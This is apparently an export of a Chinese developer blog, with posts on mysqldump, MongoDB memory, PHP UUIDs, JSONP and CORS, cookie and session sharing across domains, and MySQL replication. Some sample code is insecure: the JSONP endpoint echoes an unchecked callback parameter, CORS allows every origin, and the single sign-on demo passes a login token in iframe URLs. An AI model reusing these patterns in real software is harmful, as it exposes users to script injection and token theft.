使用charsetas默认字符集。如果没有指定，mysqldump使用utf8。 · –delayed-insert 使用INSERT DELAYED语句插入行。 · –delete-master-logs 在主复制服务器上，完成转储操作后删除二进制日志。该选项自动启用–master-data。 · –disable-keys，-K 对于每个表，用/!40000 ALTER TABLE tbl_name DISABLE KEYS /;和/!40000 ALTER TABLE tbl_name ENABLE KEYS /;语句引用INSERT语句。这样可以更快地装载转储文件，因为在插入所有行后创建索引。该选项只适合MyISAM表。 · –extended-insert，-e 使用包括几个VALUES列表的多行INSERT语法。这样使转储文件更小，重载文件时可以加速插入。 · –fields-terminated-by=…，–fields-enclosed-by=…，–fields-optionally-enclosed-by=…，–fields-escaped-by=…，–行-terminated-by=… 这些选项结合-T选项使用，与LOAD DATA INFILE的相应子句有相同的含义。 · –first-slave，-x 不赞成使用，现在重新命名为–lock-all-tables。 · –flush-logs，-F 开始转储前刷新MySQL服务器日志文件。该选项要求RELOAD权限。请注意如果结合–all–database(或-A)选项使用该选项，根据每个转储的数据库刷新日志。例外情况是当使用–lock-all-tables或–master-data的时候：在这种情况下，日志只刷新一次，在所有 表被锁定后刷新。如果你想要同时转储和刷新日志，应使用–flush-logs连同–lock-all-tables或–master-data。 · –force，-f 在表转储过程中，即使出现SQL错误也继续。 · –host=host_name，-h host_name 从给定主机的MySQL服务器转储数据。默认主机是localhost。 · –hex-blob 使用十六进制符号转储二进制字符串列(例如，’abc’ 变为0x616263)。影响到的列有BINARY、VARBINARY、BLOB。 · –lock-all-tables，-x 所有数据库中的所有表加锁。在整体转储过程中通过全局读锁定来实现。该选项自动关闭–single-transaction和–lock-tables。 · –lock-tables，-l 开始转储前锁定所有表。用READ LOCAL锁定表以允许并行插入MyISAM表。对于事务表例如InnoDB和BDB，–single-transaction是一个更好的选项，因为它不根本需要锁定表。 请注意当转储多个数据库时，–lock-tables分别为每个数据库锁定表。因此，该选项不能保证转储文件中的表在数据库之间的逻辑一致性。不同数据库表的转储状态可以完全不同。 · –master-data[=value] 该选项将二进制日志的位置和文件名写入到输出中。该选项要求有RELOAD权限，并且必须启用二进制日志。如果该选项值等于1，位置和文件名被写入CHANGE MASTER语句形式的转储输出，如果你使用该SQL转储主服务器以设置从服务器，从服务器从主服务器二进制日志的正确位置开始。如果选项值等于2，CHANGE MASTER语句被写成SQL注释。如果value被省略，这是默认动作。 –master-data选项启用–lock-all-tables，除非还指定–single-transaction(在这种情况下，只在刚开始转储时短时间获得全局读锁定。又见–single-transaction。在任何一种情况下，日志相关动作发生在转储时。该选项自动关闭–lock-tables。 · –no-create-db，-n 该选项禁用CREATE DATABASE /!32312 IF NOT EXISTS/ db_name语句，如果给出—database或–all–database选项，则包含到输出中。 · –no-create-info，-t 不写重新创建每个转储表的CREATE TABLE语句。 · –no-data，-d 不写表的任何行信息。如果你只想转储表的结构这很有用。 · –opt 该选项是速记；等同于指定 –add-drop-tables–add-locking –create-option –disable-keys–extended-insert –lock-tables –quick –set-charset。它可以给出很快的转储操作并产生一个可以很快装入MySQL服务器的转储文件。该选项默认开启，但可以用–skip-opt禁用。要想只禁用确信用-opt启用的选项，使用–skip形式；例如，–skip-add-drop-tables或–skip-quick。 · –password[=password]，-p[password] 连接服务器时使用的密码。如果你使用短选项形式(-p)，不能在选项和密码之间有一个空格。如果在命令行中，忽略了–password或-p选项后面的 密码值，将提示你输入一个。 · –port=port_num，-P port_num 用于连接的TCP/IP端口号。 · –protocol={TCP | SOCKET | PIPE | MEMORY} 使用的连接协议。 · –quick，-q 该选项用于转储大的表。它强制mysqldump从服务器一次一行地检索表中的行而不是检索所有行并在输出前将它缓存到内存中。 · –quote-names，-Q 用‘`’字符引用数据库、表和列名。如果服务器SQL模式包括ANSI_QUOTES选项，用‘“’字符引用名。默认启用该选项。可以用–skip-quote-names禁用，但该选项应跟在其它选项后面，例如可以启用–quote-names的–compatible。 · –result-file=file，-r file 将输出转向给定的文件。该选项应用在Windows中，因为它禁止将新行‘\n’字符转换为‘\r\n’回车、返回/新行序列。 · –routines，-R 在转储的数据库中转储存储程序(函数和程序)。使用—routines产生的输出包含CREATE PROCEDURE和CREATE FUNCTION语句以重新创建子程序。但是，这些语句不包括属性，例如子程序定义者或创建和修改时间戳。这说明当重载子程序时，对它们进行创建时定义者应设置为重载用户，时间戳等于重载时间。 如果你需要创建的子程序使用原来的定义者和时间戳属性，不使用–routines。相反，使用一个具有mysql数据库相应权限的MySQL账户直接转储和重载mysql.proc表的内容。 该选项在MySQL 5.1.2中添加进来。在此之前，存储程序不转储。 · –set-charset 将SET NAMES default_character_set加到输出中。该选项默认启用。要想禁用SET NAMES语句，使用–skip-set-charset。 · –single-transaction 该选项从服务器转储数据之前发出一个BEGIN SQL语句。它只适用于事务表，例如InnoDB和BDB，因为然后它将在发出BEGIN而没有阻塞任何应用程序时转储一致的数据库状态。 当使用该选项时，应记住只有InnoDB表能以一致的状态被转储。例如，使用该选项时任何转储的MyISAM或HEAP表仍然可以更改状态。 –single-transaction选项和–lock-tables选项是互斥的，因为LOCK TABLES会使任何挂起的事务隐含提交。 要想转储大的表，应结合–quick使用该选项。 · –socket=path，-S path 当连接localhost(为默认主机)时使用的套接字文件。 · –skip–comments 参见—comments选项的描述。 · –tab=path，-T path 产生tab分割的数据文件。对于每个转储的表，mysqldump创建一个包含创建表的CREATE TABLE语句的tbl_name.sql文件，和一个包含其数据的tbl_name.txt文件。选项值为写入文件的目录。 默认情况，.txt数据文件的格式是在列值和每行后面的新行之间使用tab字符。可以使用–fields-xxx和–行–xxx选项明显指定格式。 注释：该选项只适用于mysqldump与mysqld服务器在同一台机器上运行时。你必须具有FILE权限，并且服务器必须有在你指定的目录中有写文件的许可。 · –tables 覆盖—database或-B选项。选项后面的所有参量被看作表名。 · –triggers 为每个转储的表转储触发器。该选项默认启用；用–skip-triggers禁用它。 · –tz-utc 在转储文件中加入SET TIME_ZONE=’+00:00’以便TIMESTAMP列可以在具有不同时区的服务器之间转储和重载。(不使用该选项，TIMESTAMP列在具有本地时区的源服务器和目的服务器之间转储和重载）。–tz-utc也可以保护由于夏令时带来的更改。–tz-utc默认启用。要想禁用它，使用–skip-tz-utc。该选项在MySQL 5.1.2中加入。 · –user=user_name，-u user_name 连接服务器时使用的MySQL用户名。 · –verbose，-v 冗长模式。打印出程序操作的详细信息。 · –version，-V 显示版本信息并退出。 · –where=’where-condition’, -w ‘where-condition’ 只转储给定的WHERE条件选择的记录。请注意如果条件包含命令解释符专用空格或字符，一定要将条件引用起来。但是mysqldump不支持导出指定字段，顾引出第二种方法如下。 2、INTO OUTFILE（可导出csv格式 导入效率提升） 导出命令 SELECT FROM [TABLE]INTO OUTFILE ‘[FILE]’；或者SELECT FROM [TABLE]INTO OUTFILE ‘[FILE]’FIELDS TERMINATED BY ‘,’OPTIONALLY ENCLOSED BY ‘“‘LINES TERMINATED BY ‘\n’； SELECT FROM mytableINTO OUTFILE ‘/tmp/mytable.csv’FIELDS TERMINATED BY ‘,’OPTIONALLY ENCLOSED BY ‘“‘LINES TERMINATED BY ‘\n’；*二、导入 1）LOAD DATA LOAD DATA INFILE ‘[FILE]’INTO TABLE [TABLE]；或者LOAD DATA INFILE ‘[FILE]’INTO TABLE [TABLE]FIELDS TERMINATED BY ‘,’OPTIONALLY ENCLOSED BY ‘“‘LINES TERMINATED BY ‘\n’； LOAD DATA INFILE ‘/tmp/mytable.csv’INTO TABLE mytableFIELDS TERMINATED BY ‘,’OPTIONALLY ENCLOSED BY ‘“‘LINES TERMINATED BY ‘\n’;&nbsp; 2）source source只针对sql文件，测试数据六千万条网页url表信息，导入平均每0.2秒导入5000条数据，大概在四十分钟导入。 3)经常忽略的 和mysqldump相对的 mysqlimport &nbsp; &nbsp; &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MongoDB内存篇]]></title>
      <url>%2F2017%2F02%2F23%2Fmongodb%E5%86%85%E5%AD%98%E7%AF%87%2F</url>
      <content type="text"><![CDATA[刚刚接触MongoDB，惊讶于它对内存的贪得无厌，至于个中缘由，先了解下Linux是如何管理内存的，再说说MongoDB是如何使用内存的，答案自然就清楚了。 首先查看MongoDB服务器的top命令结果： shell&gt; top -p $(pidof mongod)Mem: 32872124k total, 30065320k used, 2806804k free, 245020k buffersSwap: 2097144k total, 100k used, 2097044k free, 26482048k cached VIRT RES SHR %MEM1892g 21g 21g 69.6这台MongoDB服务器有没有性能问题？大家可以一边思考一边继续阅读。 Linux是如何管理内存的在Linux里（别的系统也差不多），内存有物理内存和虚拟内存之说，物理内存是什么自然无需解释，虚拟内存实际是物理内存的抽象，多数情况下，出于方便性的考虑，程序访问的都是虚拟内存地址，然后操作系统会通过Page Table机制把它翻译成物理内存地址，详细说明可以参考Understanding Memory和Understanding Virtual Memory，至于程序是如何使用虚拟内存的，可以参考Playing with Virtual Memory，这里就不多费口舌了。 很多人会把虚拟内存和Swap混为一谈，实际上Swap只是虚拟内存引申出的一种技术而已：操作系统一旦物理内存不足，为了腾出内存空间存放新内容，就会把当前物理内存中的内容放到交换分区里，稍后用到的时候再取回来，需要注意的是，Swap的使用可能会带来性能问题，偶尔为之无需紧张，糟糕的是物理内存和交换分区频繁的发生数据交换，这被称之为Swap颠簸，一旦发生这种情况，先要明确是什么原因造成的，如果是内存不足就好办了，加内存就可以解决，不过有的时候即使内存充足也可能会出现这种问题，比如MySQL就有可能出现这样的情况，一个可选的解决方法是限制使用Swap： shell&gt; sysctl vm.swappiness=0查看内存情况最常用的是free命令： shell&gt; free -m total used free shared buffers cachedMem: 32101 29377 2723 0 239 25880-/+ buffers/cache: 3258 28842Swap: 2047 0 2047看到used一栏数值偏大，free一栏数值偏小，往往会认为内存要用光了。其实并非如此，之所以这样是因为每当我们操作文件的时候，Linux都会尽可能的把文件缓存到内存里，这样下次访问的时候，就可以直接从内存中取结果，所以cached一栏的数值非常的大，不过不用担心，这部分内存是可回收的，操作系统的虚拟内存管理器会按照LRU算法淘汰冷数据。还有一个buffers，也是可回收的，不过它是保留给块设备使用的。 知道了原理，我们就可以推算出系统可用的内存是free + buffers + cached： shell&gt; echo $((2723 + 239 + 25880))28842至于系统实际使用的内存是used – buffers – cached： shell&gt; echo $((29377 - 239 - 25880))3258除了free命令，还可以使用sar命令： shell&gt; sar -rkbmemfree kbmemused %memused kbbuffers kbcached 3224392 29647732 90.19 246116 26070160 shell&gt; sar -Wpswpin/s pswpout/s 0.00 0.00希望你没有被%memused吓到，如果不幸言中，重读本文。 再说说MongoDB是如何使用内存的目前，MongoDB使用的是内存映射存储引擎，它会把数据文件映射到内存中，如果是读操作，内存中的数据起到缓存的作用，如果是写操作，内存还可以把随机的写操作转换成顺序的写操作，总之可以大幅度提升性能。MongoDB并不干涉内存管理工作，而是把这些工作留给操作系统的虚拟内存管理器去处理，这样做的好处是简化了MongoDB的工作，但坏处是你没有方法很方便的控制MongoDB占多大内存，幸运的是虚拟内存管理器的存在让我们多数时候并不需要关心这个问题。 MongoDB的内存使用机制让它在缓存重建方面更有优势，简而言之：如果重启进程，那么缓存依然有效，如果重启系统，那么可以通过拷贝数据文件到/dev/null的方式来重建缓存，更详细的描述请参考：Cache Reheating – Not to be Ignored。 有时候，即便MongoDB使用的是64位操作系统，也可能会遭遇OOM问题，出现这种情况，多半是因为限制了内存的大小所致，可以这样查看当前值： shell&gt; ulimit -a | grep memory多数操作系统缺省都是把它设置成unlimited的，如果你的操作系统不是，可以这样修改： shell&gt; ulimit -m unlimitedshell&gt; ulimit -v unlimited注：ulimit的使用是有上下文的，最好放在MongoDB的启动脚本里。 有时候，MongoDB连接数过多的话，会拖累性能，可以通过serverStatus查询连接数： mongo&gt; db.serverStatus().connections每个连接都是一个线程，需要一个Stack，Linux下缺省的Stack设置一般比较大： shell&gt; ulimit -a | grep stackstack size (kbytes, -s) 10240至于MongoDB实际使用的Stack大小，可以用如下命令确认（单位：K）： shell&gt; cat /proc/$(pidof mongod)/limits | grep stack | awk -F ‘size’ ‘{print int($NF)/1024}’如果Stack过大（比如：10240K）的话没有意义，简单对照命令结果中的Size和Rss： shell&gt; cat /proc/$(pidof mongod)/smaps | grep 10240 -A 10所有连接消耗的内存加起来会相当惊人，推荐把Stack设置小一点，比如说1024： shell&gt; ulimit -s 1024注：从MongoDB1.8.3开始，MongoDB会在启动时自动设置Stack。 有时候，出于某些原因，你可能想释放掉MongoDB占用的内存，不过前面说了，内存管理工作是由虚拟内存管理器控制的，幸好可以使用MongoDB内置的closeAllDatabases命令达到目的： mongo&gt; use adminmongo&gt; db.runCommand({closeAllDatabases:1})另外，通过调整内核参数drop_caches也可以释放缓存： shell&gt; sysctl vm.drop_caches=1平时可以通过mongo命令行来监控MongoDB的内存使用情况，如下所示： mongo&gt; db.serverStatus().mem:{ “resident” : 22346, “virtual” : 1938524, “mapped” : 962283}还可以通过mongostat命令来监控MongoDB的内存使用情况，如下所示： shell&gt; mongostatmapped vsize res faults 940g 1893g 21.9g 0其中内存相关字段的含义是： mapped：映射到内存的数据大小 visze：占用的虚拟内存大小 res：占用的物理内存大小注：如果操作不能在内存中完成，结果faults列的数值不会是0，视大小可能有性能问题。 在上面的结果中，vsize是mapped的两倍，而mapped等于数据文件的大小，所以说vsize是数据文件的两倍，之所以会这样，是因为本例中，MongoDB开启了journal，需要在内存里多映射一次数据文件，如果关闭journal，则vsize和mapped大致相当。 如果想验证这一点，可以在开启或关闭journal后，通过pmap命令来观察文件映射情况： shell&gt; pmap $(pidof mongod)到底MongoDB配备多大内存合适？宽泛点来说，多多益善，如果要确切点来说，这实际取决于你的数据及索引的大小，内存如果能够装下全部数据加索引是最佳情况，不过很多时候，数据都会比内存大，比如本文所涉及的MongoDB实例： mongo&gt; db.stats(){ “dataSize” : 1004862191980, “indexSize” : 1335929664}本例中索引只有1G多，内存完全能装下，而数据文件则达到了1T，估计很难找到这么大内存，此时保证内存能装下热数据即可，至于热数据是多少，取决于具体的应用，你也可以通过观察faults的大小来判断当前内存是否能够装下热数据，如果faults持续变大，就说明当前内存已经不能满足热数据的大小了。如此一来内存大小就明确了：内存 &gt; 索引 + 热数据，最好有点富余，毕竟操作系统本身正常运转也需要消耗一部分内存。 关于MongoDB与内存的话题，大家还可以参考官方文档中的相关介绍。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP生成UUID]]></title>
      <url>%2F2017%2F02%2F19%2Fphp%E7%94%9F%E6%88%90uuid%2F</url>
      <content type="text"><![CDATA[UUID是指在一台机器上生成的数字，它保证对在同一时空中的所有机器都是唯一的。通常平台 会提供生成UUID的API。UUID按照开放软件基金会(OSF)制定的标准计算，用到了以太网卡地址、纳秒级时间、芯片ID码和许多可能的数字。由以 下几部分的组合：当前日期和时间(UUID的第一个部分与时间有关，如果你在生成一个UUID之后，过几秒又生成一个UUID，则第一个部分不同，其余相 同)，时钟序列，全局唯一的IEEE机器识别号（如果有网卡，从网卡获得，没有网卡以其他方式获得），UUID的唯一缺陷在于生成的结果串会比较长。关于 UUID这个标准使用最普遍的是微软的GUID(Globals Unique Identifiers)。在ColdFusion中可以用CreateUUID()函数很简单的生成UUID，其格式为：xxxxxxxx-xxxx-xxxx- xxxxxxxxxxxxxxxx(8-4-4-16)，其中每个 x 是 0-9 或 a-f 范围内的一个十六进制的数字。而标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx (8-4-4-4-12) &nbsp; &lt;?php/** Created by PhpStorm. User: merlin Date: 15-7-31 Time: 下午6:30/class UUID{ /* 生成UUID @return string*/static public function CreateId(){ if (function_exists(‘com_create_guid’)) { return trim(com_create_guid(), &apos;{}&apos;); } else { mt_srand((double)microtime() * 10000); $charid = strtoupper(md5(uniqid(rand(), TRUE))); $hyphen = chr(45); $uuid = substr($charid, 0, 8) . $hyphen . substr($charid, 8, 4) . $hyphen . substr($charid, 12, 4) . $hyphen . substr($charid, 16, 4) . $hyphen . substr($charid, 20, 12); return $uuid; }}}&nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP Ajax跨域请求]]></title>
      <url>%2F2017%2F02%2F14%2Fphp-ajax%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%2F</url>
      <content type="text"><![CDATA[&nbsp; 在开发过程中，有时会碰到需要请求其它服务器接口的问题，这时候就要jsonp来解决这个问题 html前端12345678910111213141516&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;test&lt;/title&gt;&lt;script src=&quot;jquery-1.5.2.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;ajax.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form name=&quot;form&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;sex&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;&lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;button&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; js前端1234567891011121314151617181920212223242526272829$(document).ready(function()&#123; $(&quot;#btn&quot;).click(function(k) &#123; //... var j = $(&quot;form&quot;).serializeArray();//序列化name/value $.ajax(&#123; type: &apos;GET&apos;, //这里用GET url: &apos;ajax.php&apos;, dataType: &apos;jsonp&apos;, //类型 data: j, jsonp: &apos;callback&apos;, //jsonp回调参数，必需 async: false, success: function(result) &#123;//返回的json数据 alert(result.message); //回调输出 result = result || &#123;&#125;; if (result.msg==&apos;err&apos;)&#123; alert(result.info); &#125;else if (result.msg==&quot;ok&quot;)&#123; alert(&apos;提交成功&apos;); &#125;else&#123; alert(&apos;提交失败&apos;); &#125; &#125;, timeout: 3000 &#125;) //... &#125;); php服务端12345678&lt;?php$callback = isset($_GET[&apos;callback&apos;]) ? trim($_GET[&apos;callback&apos;]) : &apos;&apos;; //jsonp回调参数，必需$date = array(&quot;age&quot;=&gt;$_GET[&apos;age&apos;], &quot;message&quot;=&gt;$_GET[&apos;age&apos;]);$date[&quot;msg&quot;]=&quot;err&quot;;$date[&quot;info&quot;]=&quot;因人品问题，发送失败&quot;;$tmp= json_encode($date); //json 数据echo $callback . &apos;(&apos; . $tmp .&apos;)&apos;; //返回格式，必需?&gt; 另外随着HTML5的快速发展，支持HTML5的浏览器，只需要在PHP的头部加上如下这两句话即可： 123//处理跨域 header(&quot;Access-Control-Allow-Origin:*&quot;); //*号表示所有域名都可以访问 header(&quot;Access-Control-Allow-Method:POST,GET&quot;);&lt;/pre&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[cookie跨域session共享]]></title>
      <url>%2F2017%2F02%2F14%2Fcookie%E8%B7%A8%E5%9F%9Fsession%E5%85%B1%E4%BA%AB%2F</url>
      <content type="text"><![CDATA[做过web开发的小伙伴们都了解cookie和session，cookie是存储在客户端的，session是存储在服务器的。 本篇主要通过一些实践中的案例和大家分享一下踩到坑，重点说明了cookie跨域问题和session服务器共享问题，以php语言为使用语言进行说明。 先聊聊cookie设置cookie无效"e589hR6VnO8K1CNQZ4PSP/LWGBhRKE5VckawQwl1TdE8d4Q5E7tW", 900);```1234&amp;nbsp;这个问题很多刚入门php的小伙们都会碰到。这个代码的本意应当是想设置cookie sso的有效期为15分钟，可是执行这个代码后发现没有效果。为什么呢？因为第三个参数expire表示的是过期的时间节点，而不是有效时间，所以如果希望设置cookie为15分钟，正确的做法应当是获取当前的时间戳加上15分钟。```setcookie(&quot;sso&quot;, &quot;e589hR6VnO8K1CNQZ4PSP/LWGBhRKE5VckawQwl1TdE8d4Q5E7tW&quot;, time() + 900); setcookie这个函数还有path、domain参数都比较常用，强烈建议刚学php的小伙们多翻阅手册。php手册地址： http://php.net/manual/zh/index.php 获取cookie值获取不到先看这样一段代码12setcookie(&quot;sso&quot;, &quot;e589hR6VnO8K1CNQZ4PSP/LWGBhRKE5VckawQwl1TdE8d4Q5E7tW&quot;, time() + 900);var_dump($_COOKIE[&quot;sso&quot;]); 明明设置了cookie，为什么第一次刷新页面取不到值，第二次刷新页面就可以了呢？ 要解决这个问题，要先了解一下setcookie后发生了什么？因为cookie是保存在客户端的，php是服务端语言，实际上setcookie之后只是在返回的http头增加一个cookie的头信息，告诉客户端需要设置一个酱紫的cookie，如下图： &nbsp; &nbsp; &nbsp; php中setcookie返回的http头 而$_COOKIE这个数组里面保存客户端传递上来的cookie。自然第一次刷新的时候因为客户端没有相应的cookie值，所以$_COOKIE是没有sso的信息的。第一次请求过后，因为服务器设置了cookie sso，所以第一次请求过来客户端就有了cookie sso的信息，所以第二次请求的时候就会带上sso的信息，服务端就能通过$_COOKIE取到值了。 cookie跨域问题这个可以说是cookie中一个比较热门的问题，面试的时候一般很爱聊这方面的问题。 跨域的业务需求大概是酱紫：用户在a.com进行了登录，希望在b.com也同步进行了登录。如果是同一个主域比较简单，可以通过setcookie中的domain参数进行设定：例如有x.a.com和xx.a.com，可以通过设置domain为a.com，从而a.com的所有二级域名都可以共享这一个cookie。基于安全方面的原因，在a.com下面设置domain为b.com是无效的。 那么是否真的没有办法可以实现这个了呢？这个还是有一些奇巧淫技的，这里介绍一种使用内框iframe的方法。 具体思路：在a.com下设置cookie后，嵌入一个iframe框链接b.com的页面，b.com设置好页面cookie后，再嵌入一个a.com的页面，然后通过parent.parent就可以调用最外层的a.com的js方法，从而进行跳转或者一些其它的操作。具体代码示例如下： 假设a.com有页面：login.php和callback.php，b.com有页面synclogin.php a.com的login.php代码：1234567891011&lt;?php$sso = &quot;e589hR6VnO8K1CNQZ4PSP/LWGBhRKE5VckawQwl1TdE8d4Q5E7tW&quot;;setcookie(&quot;sso&quot;, $sso);?&gt;login success...&lt;script type=&quot;text/javascript&quot;&gt; function jumpTo() &#123; location.href = &quot;http://a.com&quot;; &#125;&lt;/script&gt;&lt;iframe src=&quot;http://b.com/synclogin.php?sso=&lt;?php echo $sso; ?&gt;&quot;&gt;&lt;/iframe&gt; b.com的synclogin.php页面1234&lt;?phpsetcookie(&quot;sso&quot;, $_GET[&quot;sso&quot;]);?&gt;&lt;iframe src=&quot;http://a.com/callback.php&quot;&gt;&lt;/iframe&gt; a.com的callback.php页面type="text/javascript">12 parent.parent.jumpTo();&lt;/script&gt; 代码看起来也不难，值得一提的是这里嵌入了两个iframe，因为如果只用一个iframe的话，即在b.com的synclogin.php内直接调用父窗体的jumpTo方法，在有些浏览器下会提示没有权限的错误：Permission denied to access property```12345678910这里只是演示了cookie跨域同步的思路，具体细节还有很多可以改进的地方，比如iframe链接的页面可以考虑改成静态的页面，这样效率会比php动态页面快很多，还有像参数校验、多个主域（比如还有c.om）同时登录等等，这里就不再累述。cookie的总结到这里就结束，如果你感觉有一些收获，可以在页面底部扫码给我打赏哟，感谢O(∩_∩)O~## session### $_SESSION没有值这个session使用和cookie有一点不太一样，session使用前必须先调用session_start方法。否则会收到一个undefined的错误：```Notice: Undefined variable: _SESSION session存储在哪session存储在服务端，但是session究竟是存储在哪呢？php.ini中关于session有一个save_path的选项可以设置存放的目录，如果这个选项没有设置值，那么就存储在系统默认的tmp目录下。默认的tmp目录可以通过sys_get_temp_dir方法取到。 例如在mac下面，php的session一般会存储在/var/tmp目录下。123echo session_id();//本例输出ipkl446enhae25uq92c28u4lo3$_SESSION[&apos;name&apos;] = &quot;tony”;$_SESSION[&apos;users&apos;] = array(&quot;tony&quot;, &quot;andy&quot;); 通过session_id方法可以取到当前的session编号，通过这个编号可查看一下该session文件。12$ sudo more /var/tmp/sess_ipkl446enhae25uq92c28u4lo3name|s:4:&quot;tony&quot;;users|a:2:&#123;i:0;s:4:&quot;tony&quot;;i:1;s:4:&quot;andy&quot;;&#125; 可以清楚的看到session存储数据的结构，其中值是用序列化的方式进行转化存储的。 session也用了cookiesession不是存储在服务端吗，怎么又和cookie扯上关系了？其实想想也简单，因为客户端再请求的时候，服务端怎么样才能知道该客户端的session存储在哪个文件呢？其实也是通过cookie PHPSESSID来进行标识。 &nbsp; &nbsp; &nbsp; php中session的cookie标识 php在进行session操作的时候会生成一个session id，而后把这个值以cookie的形式保存在客户端，就是图示中的PHPSESSID了。客户端在下次请求的时候就会带上这个PHPSESSID，服务端就能知道当前客户端对应的session文件了。 session超时设置cookie超时设置比较简单，一个参数就搞定了。session这边有点小麻烦，既不能单独设置cookie PHPSESSID的超时时间，也不能单独设置服务端文件的超时时间。具体的可以参考鸟哥这篇文章：如何设置一个严格30分钟过期的Session，真的非常严谨，赞一下。 session服务器共享这个问题和cookie的跨域类似，面试的时候也很爱聊这个问题。 以前在做服务器集群的时候会碰到这样的一样问题，就是用户一会访问是处于正常登录状态，一会访问又没有登录了。这个问题偶尔才会出现。跟踪代码下去才发现session没有取到相应的值，想想也是醉了：原来服务器session没有设置共享，session存在在本地文件目录，当用户访问另外一台服务器的时候自然就取不到session了。 解决方法也不难，通过共享的存储在进行服务器之间的共享。这里使用redis的进行session存储。可以通过php.ini配置文件进行调整，也可以在代码中通过ini_set进行调整12ini_set(&quot;session.save_handler&quot;, &quot;redis&quot;);ini_set(&quot;session.save_path&quot;, &quot;tcp://127.0.0.1:6379”); 如果需要使用redis进行存储，需要session中的Registered save handlers支持redis &nbsp; &nbsp; &nbsp; php中session是否支持redis 当这样设置之后，session就会保存在redis中了，不同的集群服务器之间就可以通过该redis服务器进行共享了。 好吧，暂时就写到这里了，以后会发现新的坑会继续补充上来。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MySQL主从复制与读写分离介绍及原理]]></title>
      <url>%2F2017%2F02%2F13%2Fmysql-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8E%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[1.MySQL主从复制入门 首先，我们看一个图： &nbsp; &nbsp; 影响MySQL-A数据库的操作，在数据库执行后，都会写入本地的日志系统A中 假设，实时的将变化了的日志系统中的数据库事件操作，在MYSQL-A的3306端口，通过网络发给MYSQL-B。 &nbsp; MYSQL-B收到后，写入本地日志系统B，然后一条条的将数据库事件在数据库中完成。 &nbsp; 那么，MYSQL-A的变化，MYSQL-B也会变化，这样就是所谓的MYSQL的复制，即MYSQL replication。 &nbsp; 在上面的模型中，MYSQL-A就是主服务器，即master，MYSQL-B就是从服务器，即slave。 &nbsp; 日志系统A，其实它是MYSQL的日志类型中的二进制日志，也就是专门用来保存修改数据库表的所有动作，即bin log。【注意MYSQL会在执行语句之后，释放锁之前，写入二进制日志，确保事务安全】 &nbsp; 日志系统B，并不是二进制日志，由于它是从MYSQL-A的二进制日志复制过来的，并不是自己的数据库变化产生的，有点接力的感觉，称为中继日志，即relay log。 &nbsp; 可以发现，通过上面的机制，可以保证MYSQL-A和MYSQL-B的数据库数据一致，但是时间上肯定有延迟，即MYSQL-B的数据是滞后的。 【即便不考虑什么网络的因素，MYSQL-A的数据库操作是可以并发的执行的，但是MYSQL-B只能从relay log中读一条，执行下。因此MYSQL-A的写操作很频繁，MYSQL-B很可能跟不上。】 &nbsp; &nbsp;&nbsp; 2.主从复制的几种方式 &nbsp; 同步复制 所谓的同步复制，意思是master的变化，必须等待slave-1,slave-2,…,slave-n完成后才能返回。 这样，显然不可取，也不是MYSQL复制的默认设置。比如，在WEB前端页面上，用户增加了条记录，需要等待很长时间。 &nbsp; 异步复制 如同AJAX请求一样。master只需要完成自己的数据库操作即可。至于slaves是否收到二进制日志，是否完成操作，不用关心。MYSQL的默认设置。 &nbsp; 半同步复制 master只保证slaves中的一个操作成功，就返回，其他slave不管。 这个功能，是由google为MYSQL引入的。 &nbsp; &nbsp;&nbsp; 3.主从复制分析 &nbsp; 问题1：master的写操作，slaves被动的进行一样的操作，保持数据一致性，那么slave是否可以主动的进行写操作？ &nbsp; 假设slave可以主动的进行写操作，slave又无法通知master，这样就导致了master和slave数据不一致了。因此slave不应该进行写操作，至少是slave上涉及到复制的数据库不可以写。实际上，这里已经揭示了读写分离的概念。 &nbsp; 问题2：主从复制中，可以有N个slave,可是这些slave又不能进行写操作，要他们干嘛？ &nbsp; 可以实现数据备份。 类似于高可用的功能，一旦master挂了，可以让slave顶上去，同时slave提升为master。 异地容灾，比如master在北京，地震挂了，那么在上海的slave还可以继续。 主要用于实现scale out,分担负载,可以将读的任务分散到slaves上。 【很可能的情况是，一个系统的读操作远远多于写操作，因此写操作发向master，读操作发向slaves进行操作】 &nbsp; 问题3：主从复制中有master,slave1,slave2,…等等这么多MYSQL数据库，那比如一个JAVA WEB应用到底应该连接哪个数据库? &nbsp; 当 然，我们在应用程序中可以这样，insert/delete/update这些更新数据库的操作，用connection(for master)进行操作，select用connection(for slaves)进行操作。那我们的应用程序还要完成怎么从slaves选择一个来执行select，例如简单的轮循算法。 这样的话，相当于应用程序完成了SQL语句的路由，而且与MYSQL的主从复制架构非常关联，一旦master挂了，某些slave挂了，那么应用程序就要修改了。能不能让应用程序与MYSQL的主从复制架构没有什么太多关系呢？可以看下面的图： &nbsp; 找一个组件，application program只需要与它打交道，用它来完成MYSQL的代理，实现SQL语句的路由。 &nbsp; mysql proxy并不负责，怎么从众多的slaves挑一个？可以交给另一个组件(比如haproxy)来完成。 &nbsp; 这就是所谓的MYSQL READ WRITE SPLITE，MYSQL的读写分离。 &nbsp; 问题4：如果mysql proxy , direct , master他们中的某些挂了怎么办？ &nbsp; 总统一般都会弄个副总统，以防不测。同样的，可以给这些关键的节点来个备份。 &nbsp; 问题5：当master的二进制日志每产生一个事件，都需要发往slave，如果我们有N个slave,那是发N次，还是只发一次？ &nbsp; 如果只发一次，发给了slave-1，那slave-2,slave-3,…它们怎么办？ 显 然，应该发N次。实际上，在MYSQL 